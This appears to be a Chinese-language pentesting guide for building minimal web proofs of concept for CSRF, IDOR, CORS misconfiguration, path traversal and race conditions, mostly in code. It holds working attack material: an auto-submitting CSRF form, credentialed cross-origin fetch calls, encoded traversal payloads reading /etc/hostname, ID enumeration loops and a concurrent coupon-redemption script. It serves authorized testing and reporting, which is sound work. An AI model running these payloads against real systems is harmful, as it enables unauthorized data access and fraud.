---
description: Web PoC 生成 - 用最小 HTTP 请求证明结构性假设被打破
tags: [web, poc-generator, curl, minimal-repro, claim-chain, burp]
---

# Web PoC 生成 (PoC Generator): 用最小 HTTP 请求证明结构性假设被打破

> Web 的 PoC 不需要复杂工具，一个 curl 命令就能让服务器承认它错了。
> 你的 PoC 必须是：可复现、无害、不可辩驳。

## PoC 设计原则

1. **最小 HTTP 请求**：尽量用 curl 或浏览器就能复现
2. **无害 Payload**：读取 `/etc/hostname`、访问 id+1 的资源、提交测试数据
3. **Claim Chain 完整**：从"漏洞存在"到"可被利用"到"产生影响"的链条必须完整
4. **环境依赖最小**：不需要 Burp Suite、不需要自定义工具（但可以用）

---

## PoC 一：CSRF 可利用性证明

### 目标
证明目标端点可在用户不知情的情况下被跨域诱导执行。

### 环境准备

```bash
# 1. 检查目标端点的请求特征
curl -X POST https://victim.com/api/transfer \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "amount=1&to=test_account"
# 记录：HTTP 方法、Content-Type、参数名

# 2. 检查 SameSite Cookie 属性
curl -I -H "Cookie: session=xxx" https://victim.com/api/transfer | grep -i "set-cookie"
```

### PoC 步骤

**Step 1：构造恶意 HTML 页面**

```html
<!-- 保存为 csrf-poc.html，在本地用浏览器打开（或部署到任意服务器） -->
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h3>CSRF Proof of Concept</h3>
  <p>If you are logged into victim.com, this form will auto-submit.</p>
  
  <form action="https://victim.com/api/transfer" method="POST" id="poc-form">
    <input type="hidden" name="amount" value="0.01">
    <input type="hidden" name="to" value="POC_TEST_ACCOUNT">
    <input type="hidden" name="note" value="CSRF_POC_TEST">
  </form>
  
  <script>
    console.log("Auto-submitting form...");
    document.getElementById('poc-form').submit();
  </script>
</body>
</html>
```

**Step 2：在已登录状态下打开页面**

```
1. 登录 victim.com
2. 在同一浏览器中打开 csrf-poc.html
3. 观察是否发生自动提交
4. 检查 victim.com 的账户记录，是否有 "POC_TEST_ACCOUNT" 的转账记录
```

**Step 3：验证响应**

```bash
# 如果无法直接观察浏览器行为，用 fetch + credentials 测试
# 在浏览器 DevTools Console 中执行：
fetch('https://victim.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'amount=0.01&to=POC_TEST_ACCOUNT&note=CSRF_POC_TEST'
}).then(r => r.text()).then(t => console.log(t));
```

### Claim Chain

```
[Claim 1] 目标端点接受 POST 请求且可通过 form data 提交
  └── 证据: curl 测试返回 200，参数被接受

[Claim 2] 服务器不校验 Origin/Referer 头
  └── 证据: 从攻击者域名发送的请求被正常处理

[Claim 3] Cookie 在跨域请求中被自动携带
  └── 证据: SameSite=None 或未设置，浏览器发送了 Cookie

[Claim 4] 无有效的 CSRF Token 校验
  └── 证据: 不带 CSRF Token 的请求成功执行

[Conclusion] CSRF 可利用性被证明
```

---

## PoC 二：IDOR 可利用性证明

### 目标
证明通过修改资源 ID 可以访问其他用户的数据。

### PoC 步骤

**Step 1：获取合法资源 ID**

```bash
# 获取当前用户的一个资源
curl -s -H "Authorization: Bearer $TOKEN" https://victim.com/api/orders | jq '.orders[0].id'
# 假设返回 1001
```

**Step 2：测试相邻 ID**

```bash
# 测试 id-1 和 id+1
for id in 1000 1002; do
  echo "=== Testing order $id ==="
  curl -s -H "Authorization: Bearer $TOKEN" "https://victim.com/api/orders/$id" | jq '{id, customer_email, total}'
done
```

**Step 3：批量探测（无害范围）**

```bash
# 探测一个小范围，证明可遍历性
for id in $(seq 1000 1010); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "https://victim.com/api/orders/$id")
  echo "Order $id: HTTP $status"
done

# 如果 200 响应的数量 > 1，且包含不同的用户数据 → IDOR 存在
```

**Step 4：测试批量操作接口**

```bash
curl -X POST https://victim.com/api/orders/bulk-export \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ids": [1000, 1001, 1002]}' | jq '.orders | length'
# 如果返回 3 个订单且包含非当前用户的订单 → 批量 IDOR 存在
```

### Claim Chain

```
[Claim 1] 资源 ID 可预测（自增整数）或在响应中泄露
  └── 证据: API 返回的订单 ID 是连续整数

[Claim 2] 服务器未在查询中绑定 user_id
  └── 证据: 访问 id=1002 返回了不属于当前用户的订单

[Claim 3] 批量操作接口同样未做所有权校验
  └── 证据: bulk-export 返回了多个用户的订单

[Conclusion] IDOR 可利用性被证明
```

---

## PoC 三：CORS 配置错误证明

### 目标
证明 CORS 配置允许攻击者域名携带用户凭证发送跨域请求。

### PoC 步骤

**Step 1：测试 Origin 反射**

```bash
# 测试服务器是否反射任意 Origin
curl -I -H "Origin: https://attacker.com" \
  -H "Cookie: session=xxx" \
  https://victim.com/api/user/profile

# 检查响应头：
# Access-Control-Allow-Origin: https://attacker.com  ← 高危
# Access-Control-Allow-Credentials: true            ← 高危
```

**Step 2：浏览器中验证**

```javascript
// 在 https://attacker.com 的页面中打开浏览器 DevTools，执行：
fetch('https://victim.com/api/user/profile', {
  method: 'GET',
  credentials: 'include'  // 携带 Cookie
})
.then(r => r.json())
.then(data => {
  console.log('User data:', data);
  // 如果能获取到用户数据 → CORS 配置错误被利用
});
```

**Step 3：测试写操作**

```javascript
// 如果读操作成功，测试写操作
fetch('https://victim.com/api/user/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({nickname: 'CORS_POC_TEST'})
})
.then(r => r.json())
.then(data => console.log('Update result:', data));
```

---

## PoC 四：路径穿越可利用性证明

### 目标
证明通过构造特殊文件名/路径可以访问非授权文件。

### PoC 步骤

**Step 1：基本路径穿越测试**

```bash
# 测试文件下载/读取接口
TARGET="https://victim.com/api/files/download"

# 基本穿越
curl -s "$TARGET?filename=../../../etc/hostname"

# URL 编码穿越
curl -s "$TARGET?filename=..%2f..%2f..%2fetc%2fhostname"

# 双编码穿越
curl -s "$TARGET?filename=..%252f..%252fetc%252fhostname"

# Unicode 等价字符
curl -s "$TARGET?filename=..%c0%af..%c0%afetc%c0%afhostname"

# 如果返回了主机名 → 路径穿越存在
```

**Step 2：文件上传穿越测试**

```bash
# 创建测试文件
python3 -c "
import io
# 文件名包含路径穿越
data = b'PATH_TRAVERSAL_POC_TEST'
"

# 使用 curl 上传
curl -X POST https://victim.com/api/upload \
  -F "file=@/etc/hostname;filename=../../../tmp/poc_test.txt" \
  -H "Authorization: Bearer $TOKEN"

# 然后检查上传的文件是否出现在非预期路径
```

---

## PoC 五：并发竞争（Race Condition）证明

### 目标
证明通过并发请求可以利用状态推断的时间窗口。

### PoC 步骤

**Step 1：单线程基线测试**

```bash
# 先确认正常流程
curl -X POST https://victim.com/api/redeem \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE50"}'
# 记录响应：余额变化、优惠券状态
```

**Step 2：并发测试**

```bash
# 使用 parallel 并发发送 5 个请求
seq 1 5 | parallel -j5 '
  curl -s -X POST https://victim.com/api/redeem \
    -H "Authorization: Bearer '$TOKEN'" \
    -H "Content-Type: application/json" \
    -d '"'"'{"coupon":"SAVE50"}'"'"' | jq -r ".success, .remaining_balance"
'

# 如果 5 个请求中有 >1 个返回 success → Race Condition 存在
```

**Step 3：Python 脚本精确控制并发**

```python
import asyncio
import aiohttp

async def redeem(session, token, coupon):
    async with session.post(
        'https://victim.com/api/redeem',
        headers={'Authorization': f'Bearer {token}'},
        json={'coupon': coupon}
    ) as resp:
        return await resp.json()

async def main():
    token = 'YOUR_TOKEN'
    coupon = 'SAVE50'
    async with aiohttp.ClientSession() as session:
        # 同时发送 10 个请求
        tasks = [redeem(session, token, coupon) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        successes = sum(1 for r in results if r.get('success'))
        print(f"Success count: {successes}/10")

asyncio.run(main())
```

---

## PoC 报告模板

```markdown
## PoC 报告

### 漏洞概述
[一句话描述，基于第一性原理]

### 复现环境
- 目标: [URL/端点]
- 认证: [Cookie/Token/无需认证]
- 工具: [curl / 浏览器 / Python]

### 复现步骤
1. [步骤一]
2. [步骤二]
3. [步骤三]

### 预期结果
[描述运行 PoC 后应该看到什么]

### 实际结果
```
[HTTP 响应/日志输出]
```

### Claim Chain
[从证据到结论的完整逻辑链]

### 无害性声明
[说明 PoC 使用的 payload 是无害的，如：使用测试账号、读取公开文件、修改测试数据]

### 修复验证建议
[如何验证修复是否有效]
```
